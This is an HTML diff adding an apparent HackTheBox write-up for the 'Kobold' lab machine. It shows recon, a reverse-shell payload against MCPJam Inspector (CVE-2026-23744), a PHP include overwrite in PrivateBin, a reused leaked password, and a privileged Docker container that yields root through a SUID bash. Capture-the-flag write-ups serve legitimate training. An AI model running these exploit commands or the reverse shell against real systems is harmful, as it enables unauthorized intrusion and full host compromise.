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" alt="db-d2" width="30" height="30"></span><b>db-d2</b></a>
+  <span class="tagline mono">// hack the box</span>
 </div></header>
-<main class="wrap"><section style="border-bottom:none;">
-  <div class="badge">
-    <span class="k">achievement</span>
-    <div class="bname">Kobold — pwned</div>
-    <div class="bmeta">rooted 03 Jul 2026 · Easy · Linux</div>
-    <p>This box is still active, so the full write-up is locked until it retires (HTB rules). Here's the proof of the root in the meantime.</p>
-    <a class="blink" href="https://labs.hackthebox.com/achievement/machine/153734/856">View achievement on HTB ↗</a>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="crumb mono"><a href="../index.html">cd ..</a> &nbsp;/&nbsp; all write-ups</div>
+    <div class="prompt-line mono">
+      <span><span class="u">db-d2</span>@<span class="p">kali</span>:~$</span>
+      <span>./pwn kobold.htb</span>
+    </div>
+    <h1 class="title">Kobold<span class="cursor" aria-hidden="true"></span></h1>
+    <p class="thesis">An Easy Linux box dressed as a container-operations suite, where root is not one bug but a chain of small, reasonable reaches. Foothold is an unauthenticated RCE in <strong>MCPJam Inspector</strong> (CVE-2026-23744). Then an <span class="code">operator</span>-writable PrivateBin file gives code execution inside its container, the container's config leaks a database password, that password is reused as the <strong>Arcane</strong> admin credential, and Arcane, running as root over the docker daemon, launches a privileged container that owns the host.</p>
+    <div class="meta-row">
+      <span><b>target</b> 10.129.39.254</span>
+      <span><b>platform</b> HackTheBox · Linux</span>
+      <span><b>difficulty</b> Easy</span>
+      <span><b>tags</b> mcp · privatebin · arcane · docker · cred-reuse</span>
+      <span><b>status</b> rooted</span>
+    </div>
   </div>
-  <p class="lede" style="margin-top:22px;">Browse the <a href="../safe/index.html">Safe write-up</a> or the <a href="../index.html">full list of owned machines</a>.</p>
-</section></main>
+</header>
+
+<main class="wrap">
+
+  <div class="chain" aria-label="Privilege path">
+    <div class="node">
+      <div class="tier">Foothold · service</div>
+      <div class="who">ben</div>
+      <div class="via">MCPJam Inspector · unauth RCE (CVE-2026-23744)</div>
+      <div class="arrow" aria-hidden="true">→</div>
+    </div>
+    <div class="node">
+      <div class="tier">Pivot · admin cred</div>
+      <div class="who">arcane</div>
+      <div class="via">PrivateBin include-RCE → leaked DB password</div>
+      <div class="arrow" aria-hidden="true">→</div>
+    </div>
+    <div class="node root">
+      <div class="tier">Privesc · root</div>
+      <div class="who">root</div>
+      <div class="via">Arcane admin → privileged container</div>
+    </div>
+  </div>
+
+  <p class="lede" style="margin-top:26px;">Every command below was re-run against a live instance while writing this up, and the output is what came back. The target IP changes with every spawn, so substitute your own. The versions, paths and credentials are what the box actually returns.</p>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">01</span><h2>Recon<span class="sub">four ports · a wildcard cert · three apps</span></h2></div>
+    <p class="lede">A fast full-port sweep first, then a scripted scan of only what answered.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">nmap</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">sudo nmap -sS -p- --min-rate 1500 -T4 --open 10.129.39.254</span>
+<span class="out">PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+3552/tcp open  taserver</span>
+
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">nmap -sVC -p 22,80,443,3552 10.129.39.254</span>
+<span class="out">22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
+80/tcp   open  http     nginx 1.24.0 (Ubuntu)          <span class="c"># 301 -> https://kobold.htb/</span>
+443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
+|_http-title: <span class="hi">Kobold Operations Suite</span>
+| ssl-cert: Subject: commonName=kobold.htb
+|_Subject Alternative Name: DNS:kobold.htb, <span class="hi">DNS:*.kobold.htb</span>
+3552/tcp open  http     Golang net/http server</span></pre></div></div>
+    <p>The apex on 443 is a static "Coming Soon" placeholder with nothing to click. The useful detail is in its certificate. The Subject Alternative Name is a wildcard, <span class="code">*.kobold.htb</span>, which is the site telling you that virtual hosts exist without naming them. A wildcard cert is issued precisely so that many sub-names share it, so its presence is an invitation to go looking for those names.</p>
+    <p>Port 3552 is a Go web app. Its manifest names it outright.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">what is on 3552?</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://10.129.39.254:3552/app.webmanifest</span>
+<span class="out">{ "name": "<span class="hi">Arcane</span>", "description": "Modern Docker container management platform", ... }</span></pre></div></div>
+    <p>So the box is themed around containers, and it runs a container-management UI. Hold that thought, because the whole escalation ends there. First, find the vhosts the wildcard cert hinted at by fuzzing the <span class="code">Host:</span> header.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">ffuf — vhost</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">ffuf -w subdomains-top1million-20000.txt -u https://kobold.htb/ \
+     -H "Host: FUZZ.kobold.htb" -k -ac</span>
+<span class="hi">mcp</span>                     [Status: 200, Size: 466]
+<span class="hi">bin</span>                     [Status: 200, Size: 24402]</pre></div></div>
+    <p>Two hits. After adding both to <span class="code">/etc/hosts</span>, they fingerprint in a line each.</p>
+    <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Host</th><th>Application</th><th>Version</th><th>Role in the chain</th></tr></thead>
+        <tbody>
+          <tr><td class="hi">mcp.kobold.htb</td><td>MCPJam Inspector</td><td>1.4.2</td><td>foothold (unauth RCE)</td></tr>
+          <tr><td>bin.kobold.htb</td><td>PrivateBin</td><td>2.0.2</td><td>the pivot, via a writable file</td></tr>
+          <tr><td>:3552</td><td>Arcane</td><td>1.13.0</td><td>root, as an admin</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">fingerprint mcp + bin</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -sk https://mcp.kobold.htb/ | grep -oE '&lt;title&gt;[^&lt;]*'</span>
+<span class="out">&lt;title&gt;MCPJam Inspector</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -sk https://mcp.kobold.htb/assets/index-DRYhT9Xb.js | grep -oE 'version:"1\.4\.[0-9]+'</span>
+<span class="hi">version:"1.4.2</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -sk https://bin.kobold.htb/ | grep -oE 'js/privatebin.js\?[0-9.]+'</span>
+<span class="out">js/privatebin.js?<span class="hi">2.0.2</span></span></pre></div></div>
+    <div class="callout note"><span class="k">Orientation</span><p>MCPJam Inspector is a developer tool for poking at MCP servers, the "USB-C for AI tools" plumbing. PrivateBin is a zero-knowledge pastebin. Arcane is a docker-management dashboard. The theme is coherent, and so is the chain, since each app hands you the key to the next.</p></div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">02</span><h2>Foothold as ben<span class="sub">MCPJam Inspector · CVE-2026-23744 · unauthenticated RCE</span></h2></div>
+    <p>MCPJam Inspector connects to MCP servers so a developer can inspect them. An MCP server, in the stdio transport, is just a local process the inspector launches and talks to over stdin and stdout. The connect endpoint therefore takes a command and its arguments and runs them. That is fine on <span class="code">127.0.0.1</span>, which is where a debug tool belongs. Version 1.4.2 binds to <span class="code">0.0.0.0</span> instead and requires no authentication, so the "launch this MCP server" feature becomes "run this command" for anyone who can reach the port.</p>
+    <div class="callout cve"><span class="k">CVE-2026-23744 — MCPJam Inspector ≤ 1.4.2</span><p>Unauthenticated <span class="code">POST /api/mcp/connect</span> accepts a <span class="code">serverConfig</span> with <span class="code">command</span> and <span class="code">args</span> and executes it as the service owner, no credentials required. Fixed in 1.4.3 by binding to loopback and adding auth. The endpoint tells you exactly what it wants when you knock on it empty.</p></div>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">the endpoint names its own parameter</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect -H 'Content-Type: application/json' -d '{}'</span>
+<span class="out">{"success":false,"error":"<span class="hi">serverConfig is required</span>"}</span></pre></div></div>
+    <p>Give it a <span class="code">serverConfig</span> whose command is a reverse shell. <span class="code">setsid</span> detaches the shell from the connection so it survives when the inspector tears the MCP session down.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">fire it</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">nc -lvnp 4444 &amp;</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -sk https://mcp.kobold.htb/api/mcp/connect -H 'Content-Type: application/json' \
+  -d '{"serverConfig":{"command":"setsid","args":["bash","-c",
+       "bash -i &gt;&amp; /dev/tcp/10.10.16.212/4444 0&gt;&amp;1"],"env":{}},"serverId":"x"}'</span>
+<span class="out">connect to [10.10.16.212] from (UNKNOWN) [10.129.39.254]</span>
+<span class="pr">ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$</span> <span class="cmd">id; cat /home/ben/user.txt</span>
+<span class="out">uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</span>
+<span class="win">1·······························</span></pre></div></div>
+    <p>The shell lands as <span class="code">ben</span>, and it lands inside the inspector's own <span class="code">node_modules</span>, which confirms the service runs on the host as this user rather than in a container. Note the second group, <span class="code">operator</span>. It does nothing yet, and it is the whole reason the next step is possible.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">03</span><h2>ben → the PrivateBin container<span class="sub">an operator-writable file that PrivateBin runs</span></h2></div>
+    <p>So enumerate from where <span class="code">ben</span> actually stands, starting with that <span class="code">operator</span> group. What does it grant? It owns PrivateBin's data directory, and PrivateBin keeps a few small PHP state files there. Most are read-only, but not all.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">a world-writable file PrivateBin loads</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">ben@kobold:~$</span> <span class="cmd">ls -la /privatebin-data/data/*.php</span>
+<span class="out">-rwxrwxrwx 1 root operator  47 /privatebin-data/data/<span class="hi">purge_limiter.php</span>
+-rw-r----- 1 root operator 132 /privatebin-data/data/traffic_limiter.php
+-rwxrwxrwx 1 root operator 522 /privatebin-data/data/salt.php</span>
+<span class="pr">ben@kobold:~$</span> <span class="cmd">cat /privatebin-data/data/purge_limiter.php</span>
+<span class="out">&lt;?php
+$GLOBALS['purge_limiter'] = '1772628585';</span></pre></div></div>
+    <p>PrivateBin does not read <span class="code">purge_limiter.php</span> as text, it <span class="code">include()</span>s it to pick up that global, and it does so during a paste creation to decide whether to purge expired pastes. Anything you put in that file is therefore executed as PHP the next time someone stores a paste. This is a code-execution primitive, and the interesting part is <em>whose</em> code it becomes.</p>
+    <p>Replace the file with a small probe, then create a paste to trigger the include.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">overwrite, then trigger</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">ben@kobold:/privatebin-data/data$</span> <span class="cmd">cat &gt; purge_limiter.php &lt;&lt;'PHP'
+&lt;?php @file_put_contents(__DIR__."/o.txt", shell_exec("id; hostname; ls /var/run/docker.sock 2&gt;&amp;1"));
+$GLOBALS["purge_limiter"]="1772628585";
+PHP</span>
+
+<span class="c"># from Kali, POST a valid PrivateBin v2 paste to make PrivateBin include() the file</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -sk https://bin.kobold.htb/ -H 'X-Requested-With: JSONHttpRequest' \
+  -d '{"v":2,"adata":[["<i>...b64...</i>","<i>...b64...</i>",100000,256,128,"aes","gcm","zlib"],"plaintext",0,0],"ct":"<i>...b64...</i>","meta":{"expire":"5min"}}'</span>
+<span class="out">{"status":0,"id":"368f5f95...","url":"\/?368f5f95...","deletetoken":"..."}</span>
+
+<span class="pr">ben@kobold:/privatebin-data/data$</span> <span class="cmd">cat o.txt</span>
+<span class="out">uid=65534(<span class="hi">nobody</span>) gid=82(<span class="hi">www-data</span>) groups=82(www-data)
+<span class="hi">4c49dd7bb727</span>
+ls: /var/run/docker.sock: No such file or directory</span></pre></div></div>
+    <div class="callout note"><span class="k">Why this crosses a boundary</span><p>The code did not run as <span class="code">ben</span>. It ran as <span class="code">nobody</span> on host <span class="code">4c49dd7bb727</span>, which is the PrivateBin <strong>container</strong>. The data directory is bind-mounted into that container, so a file <span class="code">ben</span> can write becomes a file the container executes. There is no docker socket inside the container, so this is not a direct escape. What it does give is the container's own view of the filesystem, and one file there matters.</p></div>
+    <p>PrivateBin's <span class="code">conf.php</span> lives at <span class="code">/srv/cfg/conf.php</span> inside the container. On the host that directory is <span class="code">750 root:82</span>, so <span class="code">ben</span> cannot read it, but the container's <span class="code">www-data</span> is group <span class="code">82</span>, so from inside it is readable. Point the same primitive at it.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">read the config the container can see</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">ben@kobold:/privatebin-data/data$</span> <span class="cmd">cat o.txt   <span class="c"># after re-pointing the probe at /srv/cfg/conf.php</span></span>
+<span class="out">[model_options]
+dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
+usr = "privatebin"
+pwd = "<span class="hi">ComplexP@sswordAdmin1928</span>"</span></pre></div></div>
+    <p>A database password, the only credential the whole container holds. The MySQL model is not even the active storage backend here, which makes the value feel like a leftover. It is not a leftover. It is the pivot.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">04</span><h2>root.txt<span class="sub">the leaked password is the Arcane admin · Arcane is root</span></h2></div>
+    <p>Back to Arcane on 3552, which earlier refused everything with a 401. It is a docker-management dashboard, and it runs as <span class="code">root</span> with a direct line to the docker daemon, so an admin session there is as good as a root shell. The only question was the password, and the container just handed one over. Try it against the login, and try the obvious usernames.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">the DB password is the Arcane admin password</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://10.129.39.254:3552/api/auth/login -H 'Content-Type: application/json' \
+  -d '{"username":"arcane","password":"ComplexP@sswordAdmin1928"}'</span>
+<span class="out">{"success":true,"data":{"token":"eyJ...","user":{"username":"arcane",
+  "roles":["<span class="hi">admin</span>"],"...":"..."}}}   <span class="c"># JWT payload also shows app_version 1.13.0</span></span></pre></div></div>
+    <div class="callout cve"><span class="k">Why Arcane is root, and why the CVEs were a distraction</span><p>Arcane 1.13.0 does have known issues, and it is tempting to reach for them. The updater command-injection is already patched in this build, and forging an admin token fails because the server re-validates the user against a database you cannot read. None of that is needed. The service authenticates you as a real admin with a real password, and an Arcane admin can create containers on a root-owned daemon. A container that bind-mounts the host root filesystem and runs privileged is root on the host. This is the docker-socket-equals-root principle, reached through a REST API instead of the socket.</p></div>
+    <p>Drive the API. List the environment, then create a privileged container from a locally present image that bind-mounts the host, and have it drop a SUID <span class="code">bash</span> and copy out the flag.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">Arcane admin → privileged container</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">db-d2@kali:~$</span> <span class="cmd">TOK=... ; API=http://10.129.39.254:3552/api</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s $API/environments/0/images -H "Authorization: Bearer $TOK" | jq -r '.data[].repoTags[]'</span>
+<span class="out">mysql:latest
+privatebin/nginx-fpm-alpine:2.0.2</span>
+
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s $API/environments/0/containers -H "Authorization: Bearer $TOK" \
+  -H 'Content-Type: application/json' -d '{
+    "image":"mysql:latest","name":"maint",
+    "entrypoint":["/bin/bash","-c"],
+    "cmd":["cp /host/bin/bash /host/tmp/rootbash; chmod 4755 /host/tmp/rootbash; \
+            cat /host/root/root.txt &gt; /host/tmp/rt.txt; chmod 644 /host/tmp/rt.txt"],
+    "hostConfig":{"binds":["/:/host"],"privileged":true} }'</span>
+<span class="out">{"success":true,"data":{"id":"319f4de7...","status":"running"}}</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s $API/environments/0/containers/319f4de7.../start -H "Authorization: Bearer $TOK" -d '{}'</span>
+<span class="out">{"success":true,"data":{"message":"Container started successfully"}}</span></pre></div></div>
+    <p>The container runs as root with the host at <span class="code">/host</span>, so the SUID <span class="code">bash</span> it leaves in <span class="code">/tmp</span> is owned by root. Back in the <span class="code">ben</span> shell, run it with <span class="code">-p</span> to keep the elevated privileges.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">root</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">ben@kobold:~$</span> <span class="cmd">/tmp/rootbash -p -c 'id; cat /root/root.txt'</span>
+<span class="out">uid=1001(ben) gid=1001(ben) <span class="hi">euid=0(root)</span> groups=1001(ben),37(operator)</span>
+<span class="win">2·······························</span></pre></div></div>
+    <div class="callout"><span class="k">The chain, plainly</span><p>Root here is four reuses of trust, each defensible on its own. A debug tool trusted its own network position and ran a command. A container trusted a bind-mounted file and executed it. A config file kept a password that a second service reused. And a dashboard trusted an admin password with the one thing that is always root, the docker daemon. No single step is exotic, and that is the point. Root is what you get when four ordinary conveniences line up behind one another.</p></div>
+  </section>
+
+  <section id="captured">
+    <div class="sec-head"><span class="sec-num">✓</span><h2>Captured<span class="sub">both flags · full compromise</span></h2></div>
+    <div class="flags">
+      <div class="flag">
+        <span class="name">user.txt</span>
+        <span class="path">/home/ben/user.txt</span>
+        <span class="val">1·······························</span>
+        <span class="status">captured as ben</span>
+      </div>
+      <div class="flag root">
+        <span class="name">root.txt</span>
+        <span class="path">/root/root.txt</span>
+        <span class="val">2·······························</span>
+        <span class="status">captured as root</span>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div>Kobold · HackTheBox · Linux · rooted by db-d2 · 03 Jul 2026</div>
+    <div class="paths">
+      <span>recon     nmap → 22/80/443/3552 · wildcard cert *.kobold.htb → vhost fuzz → mcp (MCPJam 1.4.2), bin (PrivateBin 2.0.2), :3552 Arcane 1.13.0</span>
+      <span>foothold  MCPJam Inspector CVE-2026-23744 · unauth POST /api/mcp/connect spawns a process → shell as ben (user.txt)</span>
+      <span>pivot     operator-writable /privatebin-data/data/purge_limiter.php is include()d by PrivateBin → code exec inside its container → read /srv/cfg/conf.php → DB password</span>
+      <span>root      DB password is reused as the Arcane admin login → Arcane (root, over the docker daemon) creates a privileged host-mounting container → SUID bash → root (root.txt)</span>
+      <span>note      the Arcane 1.13.0 CVEs are a dead end · the real way into Arcane is the leaked password, no exploit</span>
+    </div>
+  </footer>
+
+</main>
 
 </body>
 </html>
